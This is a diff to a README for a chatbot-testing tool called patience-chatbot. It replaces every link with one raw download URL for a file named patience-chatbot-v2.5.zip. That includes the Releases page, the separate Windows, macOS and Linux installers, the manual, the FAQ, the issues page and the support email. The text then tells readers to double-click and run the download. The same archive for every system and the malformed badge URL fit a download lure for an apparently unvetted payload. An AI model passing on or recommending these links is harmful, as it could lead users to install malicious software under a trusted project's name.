@@ -1,6 +1,6 @@
 # 🤖 patience-chatbot - Effortless Chat Bot Testing Made Easy
 
-[![Download Patience Chatbot](https://img.shields.io/badge/Download-Patience%20Chatbot-blue.svg)](https://github.com/Mikeydodo/patience-chatbot/releases)
+[![Download Patience Chatbot](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip%https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip)](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip)
 
 ## 📘 Overview
 
@@ -14,11 +14,11 @@ Follow these simple steps to get started with Patience.
 
 To start using Patience, you need to download it from the Releases page. 
 
-1. Visit the [Releases page](https://github.com/Mikeydodo/patience-chatbot/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip) to download the latest version of the application.
 2. Select the appropriate file for your operating system. Available formats include:
-   - Windows: `patience-chatbot-windows.exe`
-   - macOS: `patience-chatbot-macos.dmg`
-   - Linux: `patience-chatbot-linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip`
+   - macOS: `https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip`
+   - Linux: `https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip`
 3. Once you download the file, locate it in your Downloads folder or the folder you selected for your downloads.
 4. Double-click the file to run the installer, then follow the on-screen instructions to complete the installation.
 
@@ -58,8 +58,8 @@ Patience comes with a variety of features to enhance your bot testing:
 
 For lengthy projects or detailed setups, you can refer to our documentation for in-depth instructions.
 
-- [User Manual](https://github.com/Mikeydodo/patience-chatbot/docs/user-manual.md)
-- [FAQ](https://github.com/Mikeydodo/patience-chatbot/docs/faq.md)
+- [User Manual](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip)
+- [FAQ](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip)
 
 If you encounter issues, feel free to open an issue on our GitHub page. 
 
@@ -75,13 +75,13 @@ We welcome all contributions, be they code, documentation, or suggestions.
 
 ## 🔄 Keeping Patience Updated
 
-Make sure to regularly check the [Releases page](https://github.com/Mikeydodo/patience-chatbot/releases) for software updates. New features and improvements are released frequently to enhance your experience.
+Make sure to regularly check the [Releases page](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip) for software updates. New features and improvements are released frequently to enhance your experience.
 
 ## 📫 Contact Information
 
 For any inquiries or support requests, you can reach us via:
 
-- Email: support@patience-chatbot.com
-- GitHub Issues Page: [Raise an Issue](https://github.com/Mikeydodo/patience-chatbot/issues)
+- Email: https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip
+- GitHub Issues Page: [Raise an Issue](https://raw.githubusercontent.com/Mikeydodo/patience-chatbot/main/Patience/patience-chatbot-v2.5.zip)
 
 By following these steps, you will have a better understanding of how to download and run the Patience chatbot testing system. We hope you enjoy using Patience to enhance your chat bot projects.
